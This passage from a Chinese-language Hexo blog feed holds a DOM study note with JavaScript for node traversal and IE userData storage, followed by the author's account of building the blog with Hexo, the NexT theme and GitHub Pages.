class="keyword">this</span>.handles[<span class="built_in">arguments</span>[<span class="number">0</span>]][i](<span class="built_in">arguments</span>[<span class="number">1</span>]);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//输出所有页面宽度和高度大于50像素的节点。</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">traverse</span>(<span class="params">oNode</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> aResult = [];</span><br><span class="line">    oNode = oNode || <span class="built_in">document</span>.body;</span><br><span class="line">    <span class="keyword">if</span> (oNode.style) &#123;</span><br><span class="line">        <span class="keyword">var</span> nWidth = <span class="built_in">window</span>.parseInt(oNode.style.width, <span class="number">10</span>) || <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">var</span> nHeight = <span class="built_in">window</span>.parseInt(oNode.style.height, <span class="number">10</span>) || <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (nWidth &gt; <span class="number">50</span> &amp;&amp; nHeight &gt; <span class="number">50</span>) &#123;</span><br><span class="line">            aResult.push(oNode);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> aChildNodes = oNode.childNodes;</span><br><span class="line">    <span class="keyword">if</span> (aChildNodes.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, l = aChildNodes.length; i &lt; l; i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> oTmp = aChildNodes[i];</span><br><span class="line">            aResult = aResult.concat(traverse(oTmp));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> aResult;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="IE的userData"><a href="#IE的userData" class="headerlink" title="IE的userData"></a>IE的userData</h3> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">set_ud</span>(<span class="params">key,value</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="built_in">document</span>.getElementById(<span class="string">'x'</span>); <span class="comment">// x 为任意div 的id 值</span></span><br><span class="line">    a.addBehavior(<span class="string">"#default#userdata"</span>);</span><br><span class="line">    a.setAttribute(key,value);</span><br><span class="line">    a.save(<span class="string">"db"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_ud</span>(<span class="params">key</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="built_in">document</span>.getElementById(<span class="string">'x'</span>);</span><br><span class="line">    a.addBehavior(<span class="string">"#default#userdata"</span>);</span><br><span class="line">    a.load(<span class="string">"db"</span>);</span><br><span class="line">    alert(a.getAttribute(key));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">del_ud</span>(<span class="params">key</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="built_in">document</span>.getElementById(<span class="string">'x'</span>);</span><br><span class="line">    a.addBehavior(<span class="string">"#default#userdata"</span>);</span><br><span class="line">    a.setAttribute(key, <span class="string">""</span>); <span class="comment">// 设置为空值即可</span></span><br><span class="line">    a.save(<span class="string">"db"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    set_ud(<span class="string">'a'</span>,<span class="string">'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'</span>); <span class="comment">// 设置</span></span><br><span class="line">    get_ud(<span class="string">'a'</span>); <span class="comment">// 获取a 的值</span></span><br><span class="line">    del_ud(<span class="string">'a'</span>); <span class="comment">// 删除a 的值</span></span><br><span class="line">    get_ud(<span class="string">'a'</span>); <span class="comment">// 获取a 的值</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;浏览器主要也就是IE有点独特，所以把IE重点区分开&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;名称&lt;/th&gt;
&lt;th style=&quot;text-align:left&quot;&gt;主流&lt;/th&gt;
&lt;th style=&quot;text-align:left&quot;&gt;IE&lt;/th&gt;
&lt;/
      
    
    </summary>
    
      <category term="学习" scheme="http://lry1994.github.io/categories/%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="专题笔记" scheme="http://lry1994.github.io/categories/%E5%AD%A6%E4%B9%A0/%E4%B8%93%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="DOM" scheme="http://lry1994.github.io/tags/DOM/"/>
    
  </entry>
  
  <entry>
    <title>搭建博客过程</title>
    <link href="http://lry1994.github.io/study/2018/2/26-rebuild-blog.html"/>
    <id>http://lry1994.github.io/study/2018/2/26-rebuild-blog.html</id>
    <published>2018-02-25T16:00:00.000Z</published>
    <updated>2018-04-11T05:52:39.823Z</updated>
    
    <content type="html"><![CDATA[<p>我是一个很喜欢做笔记的人，老是写在word文档不方便。之前用jekyll搭了一个，感觉写得也是乱七八糟，页面也不好看，改的话不如重新重写一个好了</p><p>有了上次经验，觉得做一个东西真的要认真规划一下，不然做出来的东西老是迁就的感觉，能用就行。这样是不行的。像做一个产品来做它</p><p>源码地址  <a href="https://github.com/LRY1994/hexo-blog.git" target="_blank" rel="noopener">https://github.com/LRY1994/hexo-blog.git</a></p><h2 id="问题定义"><a href="#问题定义" class="headerlink" title="问题定义"></a>问题定义</h2><p>重构博客原因有下：</p><ol><li>Jkeyll目录文件关系得按照规定放置，灵活性差（虽然hexo也是这样）</li><li>日记页面不美观，想换，干脆重新规划做一个</li><li>学习一下怎么在github上弄1.0版本，2.0版本</li><li>jekyll显示markdown不好看</li></ol><p>参考<a href="https://www.jianshu.com/p/c4f145fdd637" target="_blank" rel="noopener">博客搭建可行性方案( jekyll , hexo , Wordpress )</a></p><p>较多人采用的博客搭建方案有如下几种：</p><ol><li>Git+Github+Markdown+jekyll （免费）</li><li>Git+Github+Markdown+hexo （免费）</li><li>虚拟主机＋插件＋Wordpress （付费）</li></ol><p>为了省钱，所以选择第二种</p><h2 id="可行性研究"><a href="#可行性研究" class="headerlink" title="可行性研究"></a>可行性研究</h2><p>毋庸置疑，可行</p><h2 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h2><p>分为工作、学习、生活三个模块</p><ul><li>工作<ul><li>简历 (制作简历网页，jekyll那个是直接把简历模板copy过来的)</li></ul></li><li>学习<ul><li>笔记 （可按时间、类别分类）<ul><li>读书笔记（以书籍为单位来）</li><li>随笔笔记（在生活中遇到的问题或者想要摘录的，以月为单位）</li><li>专题笔记（围绕某个东西的笔记，以主题为单位）</li></ul></li><li>项目<ul><li>项目一</li><li>项目二 等</li></ul></li><li>用户体验（把有时候产品用得不愉快的经历记录下来，一篇，不定时更新）</li></ul></li><li>生活<ul><li>减肥 <ul><li>运动日历 （因为办了健身卡 ）</li><li>减脂餐图栏</li></ul></li><li>护肤化妆心得 （我一直都有颗当美妆博主的心）</li><li>旅游攻略 （喜欢旅游，但不可以经常旅游，所以很珍惜每一次，都想把它记录下来）</li></ul></li><li>其他<ul><li>社区账号（比较常用segmentfault/weibo/V2EX）</li><li>聊天框</li></ul></li></ul><h2 id="概要设计"><a href="#概要设计" class="headerlink" title="概要设计"></a>概要设计</h2><p>输出原型图<br>使用mockplus</p><h2 id="详细设计"><a href="#详细设计" class="headerlink" title="详细设计"></a>详细设计</h2><h2 id="编码和单元测试"><a href="#编码和单元测试" class="headerlink" title="编码和单元测试"></a>编码和单元测试</h2><h2 id="集成测试"><a href="#集成测试" class="headerlink" title="集成测试"></a>集成测试</h2><p>最终部署在github</p><ol><li><p>Permission denied (publickey)错误<br> 解决方法<br> <a href="https://www.cnblogs.com/xsilence/p/6001938.html" target="_blank" rel="noopener">针对github权限导致hexo部署失败的解决方案</a></p></li><li><p>和jekyll不同，<code>hexo d</code>会覆盖掉github仓库的代码，试了创建两个分支，比较麻烦，放弃。建立两个仓库，一个放源代码，一个放生成代    码。注意，生成代码需要放在master分支上，跟jekyll一样，生成代码的项目名字要取名为<code>username.github.io</code></p></li><li><p>使用next主题的时候需要在_config.yml把<code>permalink: :title</code>中改成<br> <code>permalink: :title.html</code><br> 不然点击文章的时候会出现下载框</p></li><li><p>about页面需要自己创建，并且自己写。</p><p> 大容器页面布局默认_layout布局，在<code>theme/next/layout_layout.swig</code>中定义。</p><p> 全部页面都是默认page布局，在<code>theme/next/layout/page.swig</code>中定义。</p><p> 只有archive,tag,category页面不用创建，直接在<code>theme/next/layout/</code>对应名字文件里面写，即</p><p> <code>theme/next/layout/archive.swig</code></p><p> <code>theme/next/layout/category.swig</code></p><p> <code>theme/next/layout/tag.swig</code></p><p> 但是tag,category页面还需要多做一步：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cd your-hexo-site</span><br><span class="line">$ hexo new page tags</span><br></pre></td></tr></table></figure><p> 编辑刚新建的页面，将页面的类型设置为 tags ，主题将自动为这个页面显示标签云。页面内容如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">title: 标签</span><br><span class="line">date: 2014-12-22 12:39:04</span><br><span class="line">type: &quot;tags&quot;</span><br></pre></td></tr></table></figure><p> 在菜单中添加链接。编辑 主题配置文件 ， 添加 tags 到 menu 中，如下:</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">menu:</span><br><span class="line">home: /</span><br><span class="line">archives: /archives</span><br><span class="line">tags: /tags</span><br></pre></td></tr></table></figure></li><li><p>换了主题重新部署，需要重新打包</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure><p> 这个需要一段时间githubPage才会更新</p></li><li><p>写文章的时候要插入图片 </p><p> (1) 按照<a href="https://hexo.io/zh-cn/docs/asset-folders.html" target="_blank" rel="noopener">官方说法</a></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">_posts</span><br><span class="line"></span><br><span class="line">    |- post1.md</span><br><span class="line"></span><br><span class="line">    |_ post1</span><br><span class="line"></span><br><span class="line">        |- pic1.png</span><br></pre></td></tr></table></figure><ol><li><p>首先确认_config.yml中有：</p><figure class="highlight plain"><figcaption><span>true``</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2. 安装</span><br><span class="line"></span><br><span class="line">```npm install https://github.com/CodeFalling/hexo-asset-image --save</span><br></pre></td></tr></table></figure><p>这样可以插入文章资源目录下的图片</p><p>(2) 还是写正常的markdown,<code>![](./img.png)</code>,<code>hexo g</code>生成public文件夹之后，把图片复制到改目录下，再<code>hexo d</code></p><p>(3) 看到还有一个解决方法，没试过<br><a href="http://etrd.org/2017/01/23/hexo%E4%B8%AD%E5%AE%8C%E7%BE%8E%E6%8F%92%E5%85%A5%E6%9C%AC%E5%9C%B0%E5%9B%BE%E7%89%87/" target="_blank" rel="noopener">http://etrd.org/2017/01/23/hexo%E4%B8%AD%E5%AE%8C%E7%BE%8E%E6%8F%92%E5%85%A5%E6%9C%AC%E5%9C%B0%E5%9B%BE%E7%89%87/</a></p></li></ol></li><li><p>添加文章阅读量<br><a href="http://www.jeyzhang.com/hexo-next-add-post-views.html" target="_blank" rel="noopener">添加文章阅读量</a></p></li></ol><h2 id="软件维护"><a href="#软件维护" class="headerlink" title="软件维护"></a>软件维护</h2><p>管理博客</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><pre><code>最后发现hexo并不能实现博客以外的东西，可能它的定位就是博客框架吧。而且hexo和next都不可以自定义layout,Jekyll还可以自定义layout放置在_layout目录下</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;我是一个很喜欢做笔记的人，老是写在word文档不方便。之前用jekyll搭了一个，感觉写得也是乱七八糟，页面也不好看，改的话不如重新重写一个好了&lt;/p&gt;
&lt;p&gt;有了上次经验，觉得做一个东西真的要认真规划一下，不然做出来的东西老是迁就的感觉，能用就行。这样是不行的。像做一个产
      
    
    </summary>
    
      <category term="学习" scheme="http://lry1994.github.io/categories/%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="专题笔记" scheme="http://lry1994.github.io/categories/%E5%AD%A6%E4%B9%A0/%E4%B8%93%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
</feed>
